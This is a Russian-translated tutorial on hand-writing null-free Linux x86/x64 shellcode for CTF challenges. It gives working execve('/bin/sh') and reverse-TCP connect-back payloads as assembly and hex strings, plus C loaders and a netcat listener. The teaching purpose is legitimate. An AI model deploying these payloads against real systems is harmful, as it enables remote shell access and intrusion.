Источник:https://axcheron.github.io/l
Ссылка: https://axcheron.github.io/linux-shellcode-101-from-hell-to-shell/


Мы все любим играть в CTF, варгеймы и другие онлайн-задачи (ну, я люблю). Но в большинстве случаев, когда нам нужен шелл-код, мы ленимся и гуглим какой-нибудь кусок (дерьмо) шелл-кода, который просто не работает. И после 13 попыток с разными шелл-кодами, в конце концов, это работает, или вы просто сдаетесь и берете шелл-код того, кто решил задачу. СТЫД !

Шучу, у меня тоже такое было. Я имею в виду, вы решили задачу, вы получили контроль над EIP, вам просто нужен работающий шеллкод, верно? Почему, работая своей задницей?

# Зачем писать шеллкод? 

Ну во-первых, если вам нужен простой _execve()_ на `/bin/sh`вы должны знать, как это написать. Во-вторых, иногда вы будете сталкиваться с более _сложной_ ситуацией, когда вам нужно знать, как написать собственный шеллкод. В этих случаях использования вы ничего не найдете в Интернете. Наконец, когда вы делаете CTF, скорость является ключевым моментом. Если вы знаете свое ремесло, вы можете написать все, что захотите, в мгновение ока!

# От C к сборке 

В конечном счете, вы, вероятно, будете писать свой шелл-код прямо на ассемблере. Однако интересно понять весь процесс преобразования фрагмента кода высокого уровня в двоичную строку. Начнем с простого кода C:

```c
// gcc -o print print.c
#include <stdio.h>

void main() {
  printf("YOLO !\n");
}
```

Теперь мы можем скомпилировать его и протестировать.

```bash
root@nms:~# gcc -o print print.c
root@nms:~# ./print
YOLO !
```

Здесь мы можем использовать `strace`команда, чтобы увидеть внутреннюю работу нашего исполняемого файла. Эта команда перехватывает и записывает системные вызовы, вызываемые процессом, и сигналы, полученные процессом.

```bash
root@nms:~# strace ./print
execve("./print", ["./print"], 0x7fffb1ec4320 /* 22 vars */) = 0
brk(NULL)                               = 0x55e96fbcd000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3

...[removed]...

brk(NULL)                               = 0x55e96fbcd000
brk(0x55e96fbee000)                     = 0x55e96fbee000
write(1, "YOLO !\n", 7YOLO !
)                 = 7
exit_group(7)                           = ?
+++ exited with 7 +++
```

Интересная часть — это вызов _write()_ , который является [системным вызовом](http://man7.org/linux/man-pages/man2/write.2.html) ; 4-й.

**Примечание.** Полный справочник 32-разрядных системных вызовов можно найти на странице [https://syscalls.kernelgrok.com/](https://syscalls.kernelgrok.com/) .

Этот вызов принимает 3 аргумента. Первый — **1** , который просит системный вызов напечатать строку на стандартном выходе ( _STDOUT_ ). Второй — указатель на нашу строку, а третий — размер строки ( _7_ ).

```c
ssize_t write(int fd, const void *buf, size_t count);
```

Чтобы использовать **системный вызов** в ассемблере, нам нужно вызвать прерывание 0x80 или `int 0x80`. Теперь мы можем начать писать ассемблерный код:

```c
; sudo apt-get install libc6-dev-i386
; nasm -f elf32 print_asm.asm
; ld -m elf_i386 print_asm.o -o print_asm
BITS 32
section .data
msg   db    "PLOP !", 0xa

section .text
global _start

_start:
mov eax, 4 ; syscall to write()
mov ebx, 1
mov ecx, msg
mov edx, 7
int 0x80

mov eax, 1
mov ebx, 0
int 0x80
```

Затем вы можете собрать его и связать:

```bash
root@nms:~/asm# nasm -f elf32 print_asm.asm
root@nms:~/asm# ld -m elf_i386 print_asm.o -o print_asm
root@nms:~/asm# ./print_asm
PLOP !
```

Хорошо, у вас есть некоторые знания о системных вызовах и некоторые основы преобразования кода C в ассемблере.

# От сборки к 

Следующим шагом будет преобразование нашего ассемблерного кода в шеллкод. Но что такое шеллкод? Ну, это строка, которая может быть выполнена процессором как двоичный код. Вот как это выглядит в шестнадцатеричном формате:

```bash
root@nms:~/asm# objdump -Mintel -D print_asm

print_asm:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:	b8 04 00 00 00       	mov    eax,0x4
 8049005:	bb 01 00 00 00       	mov    ebx,0x1
 804900a:	b9 00 a0 04 08       	mov    ecx,0x804a000
 804900f:	ba 07 00 00 00       	mov    edx,0x7
 8049014:	cd 80                	int    0x80
 8049016:	b8 01 00 00 00       	mov    eax,0x1
 804901b:	bb 00 00 00 00       	mov    ebx,0x0
 8049020:	cd 80                	int    0x80

Disassembly of section .data:

0804a000 <msg>:
 804a000:	50                   	push   eax
 804a001:	4c                   	dec    esp
 804a002:	4f                   	dec    edi
 804a003:	50                   	push   eax
 804a004:	20 21                	and    BYTE PTR [ecx],ah
 804a006:	0a                   	.byte 0xa
```

**:** Примечание `<msg>`функция выглядит как ассемблерный код, но это наша строка **«PLOP!»** . `Objdump` нет реальных различий между _кодом_ и _данными ._ интерпретирует его как код, но, как вы, наверное, знаете, в машинном коде

The `<_start>`функция содержит наш код. Но, если присмотреться, там много _нулевых_ байтов. Если вы попытаетесь использовать эту строку в качестве шелл-кода, компьютер будет интерпретировать _нулевые_ байты как терминаторы строки, поэтому, очевидно, если он начнет читать ваш шелл-код и увидит нулевой байт, он остановится и, возможно, завершит процесс.

Однако нам часто нужны нулевые байты в нашем коде; в качестве параметра функции или для объявления строковой переменной. Удалить нулевые байты из шелл-кода не так уж и сложно, вам просто нужно проявить творческий подход и найти альтернативный способ генерации нужных вам нулевых байтов.

Позвольте мне показать вам, как это делается на нашем предыдущем примере:

```c
; nasm -f elf32 print_asm_2.asm
; ld -m elf_i386 print_asm_2.o -o print_asm_2
BITS 32

section .text
global _start

_start:
xor eax, eax    ; EAX = 0
push eax        ; string terminator (null byte)
push 0x0a202120 ; line return (\x0a) + " ! " (added space for padding)
push 0x504f4c50 ; "POLP"
mov ecx, esp    ; ESP is our string pointer
mov al, 4       ; AL is 1 byte, enough for the value 4
xor ebx, ebx    ; EBX = 0
inc ebx         ; EBX = 1
xor edx, edx    ; EDX = 0
mov dl, 8       ; DL is 1 byte, enough for the value 8 (added space)
int 0x80        ; print

mov al, 1       ; AL = 1
dec ebx         ; EBX was 1, we decrement
int 0x80        ; exit
```

Теперь нет нулевых байтов! Ты мне не веришь? Проверь это :

```bash
$ nasm -f elf32 print_asm_2.asm
$ ld -m elf_i386 print_asm_2.o -o print_asm_2
$ ./print_asm_2
PLOP !
$ objdump -Mintel -D print_asm_2

print_asm_2:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:	31 c0                	xor    eax,eax
 8049002:	50                   	push   eax
 8049003:	68 20 21 20 0a       	push   0xa202120
 8049008:	68 50 4c 4f 50       	push   0x504f4c50
 804900d:	89 e1                	mov    ecx,esp
 804900f:	b0 04                	mov    al,0x4
 8049011:	31 db                	xor    ebx,ebx
 8049013:	43                   	inc    ebx
 8049014:	31 d2                	xor    edx,edx
 8049016:	b2 08                	mov    dl,0x8
 8049018:	cd 80                	int    0x80
 804901a:	b0 01                	mov    al,0x1
 804901c:	4b                   	dec    ebx
 804901d:	cd 80                	int    0x80
```

Здесь мы использовали несколько приемов, чтобы избежать нулевых байтов. Вместо того, чтобы перемещать **0** в регистр, мы **выполняем XOR** , результат тот же, но нет нулевых байтов:

```
$ rasm2 -a x86 -b 32 "mov eax, 0"
b800000000
$ rasm2 -a x86 -b 32 "xor eax, eax"
31c0
```

Вместо перемещения 1-байтового значения в 4-байтовый регистр мы используем 1-байтовый регистр:

```bash
$ rasm2 -a x86 -b 32 "mov eax, 1"
b801000000
$ rasm2 -a x86 -b 32 "mov al, 1"
b001
```

А для строки мы просто поместили ноль в стек для терминатора, поместили строковое значение в 4-байтовые куски (обратные, из-за прямого порядка следования байтов) и использовали ESP в качестве _указателя_ на строку:

```c
xor eax, eax    
push eax       
push 0x0a202120 ; line return + " ! "
push 0x504f4c50 ; "POLP"
mov ecx, esp
```

# Код «оболочки» 

Нам было весело печатать строки на нашем терминале, но где же **«оболочка»** нашего шелл-кода? Хороший вопрос ! Давайте создадим шелл-код, который на самом деле вызовет приглашение оболочки.

Для этого мы будем использовать другой системный вызов, [execve](http://man7.org/linux/man-pages/man2/execve.2.html) , который имеет номер **11** или **0xb** в [таблице системных вызовов](https://syscalls.kernelgrok.com/) . Он принимает 3 аргумента:

- Программа для выполнения -> _EBX_
- Аргументы или _argv_ (null) -> _ECX_
- Окружение или envp (null) -> _EDX_

```c
int execve(const char *filename, char *const argv[], char *const envp[]);
```

На этот раз мы напишем код напрямую без нулевых байтов.

```c
; nasm -f elf32 execve.asm
; ld -m elf_i386 execve.o -o execve
BITS 32

section .text
global _start

_start:
xor eax, eax
push eax        ; string terminator
push 0x68732f6e ; "hs/n"
push 0x69622f2f ; "ib//"
mov ebx, esp    ; "//bin/sh",0 pointer is ESP
xor ecx, ecx    ; ECX = 0
xor edx, edx    ; EDX = 0
mov al, 0xb     ; execve()
int 0x80  
```

Теперь давайте соберем его и проверим, правильно ли он работает и не содержит ли _нулевых_ байтов.

```bash
# nasm -f elf32 execve.asm
# ld -m elf_i386 execve.o -o execve
# ./execve 
# id
uid=0(root) gid=0(root) groups=0(root)
# exit    

# objdump -Mintel -D execve

08049000 <_start>:
 8049000:       31 c0                   xor    eax,eax
 8049002:       50                      push   eax
 8049003:       68 6e 2f 73 68          push   0x68732f6e
 8049008:       68 2f 2f 62 69          push   0x69622f2f
 804900d:       89 e3                   mov    ebx,esp
 804900f:       31 c9                   xor    ecx,ecx
 8049011:       31 d2                   xor    edx,edx
 8049013:       b0 0b                   mov    al,0xb
 8049015:       cd 80                   int    0x80
```

**Примечание.** Существует несколько способов написания одного и того же шелл-кода, это всего лишь пример.

Я знаю, о чем вы думаете: «Эй, это не шеллкод, это исполняемый файл!», и вы правы! Это **ELF-** файл.

```bash
$ file execve
execve: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

Как мы собрались( `nasm`) и связанных ( `ld`) наш код, он содержится в ELF, но в реальном случае использования вы не внедряете файл ELF, поскольку исполняемый файл, на который вы нацеливаете, уже отображен в памяти, вам просто нужно ввести код.

Вы можете легко извлечь шелл-код, используя `objdump`и немного _баш-фу_ :


```bash
$ objdump -d ./execve|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
```

Теперь вы можете использовать эту строку или _шелл-код_ и внедрить его в процесс.

# загрузчика шеллкода 

Теперь предположим, что вы хотите протестировать свой шелл-код. Во-первых, нам нужно что-то для интерпретации нашего шелл-кода. Как вы знаете, шелл-код предназначен для внедрения в работающую программу, поскольку в нем нет функций, которые выполняются сами по себе, как в классическом ELF. Для этого можно использовать следующий фрагмент кода:

```c
// gcc -m32 -z execstack exec_shell.c -o exec_shell
#include <stdio.h>
#include <string.h>

unsigned char shell[] = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";

main() {
  int (*ret)() = (int(*)())shell;
  ret();
}
```

Или этот, который немного отличается:

```c
// gcc -m32 -z execstack exec_shell.c -o exec_shell
char shellcode[] =
	"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";
 
int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;  
	(*ret) = (int)shellcode;
}
```

**Примечание.** Вы можете найти некоторую информацию об этом коде C [здесь](http://disbauxes.upc.es/code/two-basic-ways-to-run-and-test-shellcode/) .

# Connect-Back или Reverse TCP Шеллкод 

Мы могли бы сделать шелл-код Bind TCP, но в настоящее время брандмауэры блокируют большую часть входящего соединения, поэтому мы предпочитаем, чтобы шелл-код автоматически подключался к нашей машине. Основная идея этого шеллкода состоит в том, чтобы подключиться к нашей машине через определенный порт и предоставить нам оболочку. Во-первых, нам нужно создать сокет с помощью _системного вызова socket()_ и соединить сокет с адресом сервера (нашей машины) с помощью _системного вызова connect()_ .

Системный вызов сокета называется [socketcall()](http://man7.org/linux/man-pages/man2/socketcall.2.html) и использует номер **0x66** . Он принимает 2 аргумента:

- Тип сокета, здесь **SYS_SOCKET** или **1** -> _EBX_
- args _>_ , указатель на блок, содержащий фактические аргументы - _ECX_

```c
int socketcall(int call, unsigned long *args);
```

Есть 3 аргумента для вызова [socket()](http://man7.org/linux/man-pages/man2/socket.2.html) :

- Коммуникационный домен, здесь _AF_INET_ (2) или IPv4
- Тип сокета, _SOCK_STREAM_ (1) или TCP
- Используемый протокол, который равен 0, поскольку с TCP существует только один протокол.

```c
int socket(int domain, int type, int protocol);
```

После того, как мы создали сокет, нам нужно подключиться к удаленной машине, используя **тип SYS_CONNECT** или **3** с аргументом для _connect()_ . Опять же, мы повторно используем номер системного вызова **0x66** , но со следующими аргументами:

- Тип сокета, здесь [SYS_CONNECT](http://man7.org/linux/man-pages/man2/connect.2.html) или **3** -> _EBX_
- args _>_ , указатель на блок, содержащий фактические аргументы - _ECX_

Есть 3 аргумента для вызова [connect()](http://man7.org/linux/man-pages/man2/connect.2.html) :

- Дескриптор файла, ранее созданный с помощью _socket()_
- Указатель на _структуру sockaddr_ , содержащую семейство IP, портов и адресов (AF_INET).
- Аргумент _addrlen_ , указывающий размер _sockaddr_ или 16 байт.

```c
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```

Чтобы вы знали, вот определение структуры _sockaddr_ :

```c
struct sockaddr {
	sa_family_t	sa_family;	/* address family, AF_xxx	*/
	char		sa_data[14];	/* 14 bytes of protocol address	*/
};
```

Теперь давайте запишем это:

```c
; nasm -f elf32 connectback.asm
; ld -m elf_i386 connectback.o -o connectback
BITS 32

section .text
global _start

_start:
; Call to socket(2, 1, 0)
push 0x66     ; socketcall()
pop eax 
xor ebx, ebx
inc ebx       ; EBX = 1 for SYS_SOCKET
xor edx, edx  ; Bulding args array for socket() call
push edx      ; proto = 0 (IPPROTO_IP)
push BYTE 0x1 ; SOCK_STREAM
push BYTE 0x2 ; AF_INET
mov ecx, esp  ; ECX contain the array pointer
int 0x80      ; After the call, EAX contains the file descriptor

xchg esi, eax ; ESI = fd

; Call to connect(fd, [AF_INET, 4444, 127.0.0.1], 16)
push 0x66         ; socketcall()
pop eax 
mov edx, 0x02010180 ; Trick to avoid null bytes (128.1.1.2)
sub edx, 0x01010101 ; 128.1.1.2 - 1.1.1.1 = 127.0.0.1
push edx          ; store 127.0.0.1
push WORD 0x5c11  ; push port 4444
inc ebx           ; EBX = 2
push WORD bx      ; AF_INET
mov ecx, esp      ; pointer to sockaddr
push BYTE 0x10    ; 16, size of addrlen
push ecx          ; new pointer to sockaddr
push esi          ; fd pointer
mov ecx, esp      ; ECX contain the array pointer
inc ebx           ; EBX = 3 for SYS_CONNECT
int 0x80          ; EAX contains the connected socket
```

Теперь соберите и слинкуйте шелл-код, затем откройте прослушиватель в другой оболочке и запустите код:

```
$ nc -lvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 51834
```

Ваш шеллкод будет _segfault_ , но это нормально. Тем не менее, вы должны получить соединение на вашем слушателе. Теперь нам нужно реализовать **шелл-** часть нашего шелл-кода. Для этого нам придется поиграть с _файловыми дескрипторами_ . Есть 3 стандартных файловых дескриптора:

- **стандартный ввод** или 0 (ввод)
- **стандартный вывод** или 1 (вывод)
- **stderr** или 2 (ошибка)

Идея состоит в том, чтобы дублировать стандартные файловые дескрипторы в файловом дескрипторе, полученном с помощью вызова connect _()_ , а затем вызвать _/bin/sh_ . Таким образом, мы сможем иметь обратную оболочку на целевой машине.

Существует системный вызов [dup2](http://man7.org/linux/man-pages/man2/dup2.2.html) , номер **0x3f** , который может помочь нам с этой задачей. Он принимает 2 аргумента:

- Старый _fd_ -> _EBX_
- Новый _fd_ -> _ECX_

```c
int dup2(int oldfd, int newfd);
```

Давайте реализуем остальную часть кода:

```c
; Call to dup2(fd, ...) with a loop for the 3 descriptors
xchg eax, ebx   ; EBX = fd for connect()
push BYTE 0x2   ; we start with stderr
pop ecx

loop:
mov BYTE al, 0x3f ; dup2()
int 0x80
dec ecx
jns loop ; loop until sign flag is set meaning ECX is negative

; Call to execve()
xor eax, eax
push eax        ; string terminator
push 0x68732f6e ; "hs/n"
push 0x69622f2f ; "ib//"
mov ebx, esp    ; "//bin/sh",0 pointer is ESP
xor ecx, ecx    ; ECX = 0
xor edx, edx    ; EDX = 0
mov al, 0xb     ; execve()
int 0x80  
```

Пересоберите шелл-код с добавленной подпрограммой и запустите слушатель, вы должны получить шелл:

```bash
$ ./connectback 
# id
uid=0(root) gid=0(root) groups=0(root)
```

Вы можете попробовать извлечь шелл-код, он должен быть свободен от нулевых байт :)

```bash
objdump -d ./connectback|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x6a\x66\x58\x31\xdb\x43\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\xba\x80\x01\x01\x02\x81\xea\x01\x01\x01\x01\x52\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
```

# x64 

Мы предполагаем, что вы уже знаете 64-битный ассемблерный код, если нет, то это почти то же самое, что и 32-битные инструкции… В любом случае, 64-битный шеллкод так же прост, как и 32-битные.

**Примечание.** В Интернете можно найти множество ссылок на 64-битные системные вызовы, например [этот](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) .

Основное отличие:

- Вместо того, чтобы звонить `ìnt 0x80`чтобы вызвать системный вызов, мы используем `syscall`инструкция
- Регистры **64-битные** (О РЛИ?!)
- Системный вызов execve _()_ равен **59** (целое число).
- Вместо использования _EAX, EBX, ECX и т. д._ для системного вызова используется _RAX, RDI, RSI, RDX и т. д._

Давайте попробуем воспроизвести _шелл-код execve(),_ который мы сделали ранее.

```c
; nasm -f elf64 execve64.asm
; ld -m elf_x86_64 execve64.o -o execve64
section .text
global _start

_start:
xor rax, rax
push rax        ; string terminator
mov rax, 0x68732f6e69622f2f ; "hs/nib//" (Yay! 64-bit registers)
push rax
mov rdi, rsp    ; "//bin/sh",0 pointer is RSP
xor rsi, rsi    ; RSI = 0
xor rdx, rdx    ; RDX = 0
xor rax, rax    ; RAX = 0
mov al, 0x3b    ; execve()
syscall
```

**Примечание.** Здесь мы не помещали строку в стек напрямую, потому что помещение 64-битного немедленного значения невозможно. Итак, мы использовали RAX в качестве промежуточного регистра.

Теперь вы можете попробовать. Обратите внимание, что аргументы компиляции изменились.

```bash
$ nasm -f elf64 execve64.asm
$ ld -m elf_x86_64 execve64.o -o execve64
$ ./execve64 
# id
uid=0(root) gid=0(root) groups=0
```

Легко, верно?

```bash
$ objdump -d ./execve64|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x48\x31\xc0\x50\x48\xb8\x2f\x2f\x62\x69\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05"
```

Теперь твоя очередь, сделай их меньше, сделай их умнее!